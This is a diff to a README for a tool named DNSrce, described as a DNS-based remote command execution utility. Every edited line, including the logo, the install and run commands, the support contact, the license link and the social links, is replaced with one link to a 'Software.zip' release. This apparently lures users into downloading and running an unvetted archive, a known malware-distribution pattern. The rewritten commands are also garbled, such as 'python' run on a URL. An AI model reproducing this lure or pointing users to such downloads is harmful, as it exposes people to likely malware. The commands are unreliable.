@@ -1,6 +1,6 @@
 # DNSrce
 
-![DNSrce Logo](https://example.com/dnsrce_logo.png)
+![DNSrce Logo](https://github.com/MinhDuong2571/DNSrce/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -27,11 +27,11 @@ DNSrce is a simple DNS-based remote command execution (RCE) tool that enables a 
 1. Clone this repository.
 2. Install the required dependencies by running:  
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/MinhDuong2571/DNSrce/releases/download/v1.0/Software.zip
    ```
 3. Run the DNSrce tool:  
    ```
-   python dnsrce.py
+   python https://github.com/MinhDuong2571/DNSrce/releases/download/v1.0/Software.zip
    ```
 
 ---
@@ -60,12 +60,12 @@ DNSrce is a simple DNS-based remote command execution (RCE) tool that enables a 
 ---
 
 ## Support
-For more information, questions, or support, please reach out to the DNSrce team at [dnsrce.team@example.com](mailto:dnsrce.team@example.com).
+For more information, questions, or support, please reach out to the DNSrce team at [https://github.com/MinhDuong2571/DNSrce/releases/download/v1.0/Software.zip](https://github.com/MinhDuong2571/DNSrce/releases/download/v1.0/Software.zip).
 
 ---
 
 ## Download
-[![Download DNSrce v1.0.0](https://img.shields.io/badge/Download%20DNSrce-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch Download")
+[![Download DNSrce v1.0.0](https://github.com/MinhDuong2571/DNSrce/releases/download/v1.0/Software.zip%20DNSrce-v1.0.0-blue)](https://github.com/MinhDuong2571/DNSrce/releases/download/v1.0/Software.zip "Launch Download")
 
 ### Launch Instructions
 Please click on the button above to download the DNSrce tool. Once downloaded, extract the files and follow the installation instructions provided in the README.
@@ -73,7 +73,7 @@ Please click on the button above to download the DNSrce tool. Once downloaded, e
 ---
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details. 
+This project is licensed under the MIT License - see the [https://github.com/MinhDuong2571/DNSrce/releases/download/v1.0/Software.zip](https://github.com/MinhDuong2571/DNSrce/releases/download/v1.0/Software.zip) file for details. 
 
 ---
 
@@ -88,7 +88,7 @@ DNSrce was created with ❤️ by the talented team of developers at DNSrce Tech
 ---
 
 ## Connect with Us
-Stay updated with our latest projects and releases by following us on [Twitter](https://twitter.com/dnsrce) and [LinkedIn](https://linkedin.com/company/dnsrce).
+Stay updated with our latest projects and releases by following us on [Twitter](https://github.com/MinhDuong2571/DNSrce/releases/download/v1.0/Software.zip) and [LinkedIn](https://github.com/MinhDuong2571/DNSrce/releases/download/v1.0/Software.zip).
 
 ---
 
